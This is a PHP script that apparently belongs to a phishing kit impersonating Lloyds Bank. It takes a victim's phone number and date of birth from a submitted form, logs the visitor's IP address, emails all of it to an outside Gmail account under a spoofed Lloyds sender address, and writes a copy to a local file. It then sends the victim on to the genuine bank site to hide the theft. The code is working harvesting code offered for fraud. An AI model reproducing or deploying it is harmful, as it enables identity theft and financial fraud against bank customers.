<?php

$phone = $_POST['phone'] ; 
$day = $_POST['dob-day'] ; 
$month = $_POST['dob-month'] ; 
$year = $_POST['dob-year'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="hfaidhmoukim@gmail.com" ; 
 $subject = " birthday |Lloyd |: from: ".$ip;
$nome="ahla bel uk twa7eshtkom " ; 
	$from="rzlt@lloyd.uk" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ Victem Detail :D  +-----------------\r\n";

$message .= "Phone number : ".$phone."\r\n";
$message .= "Date of birth : " .$day.'/'.$month.'/'.$year."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../zarga3.txt", "a");  
fwrite($sajal, $message);


	header('Location: https://www.lloydsbank.com');



?>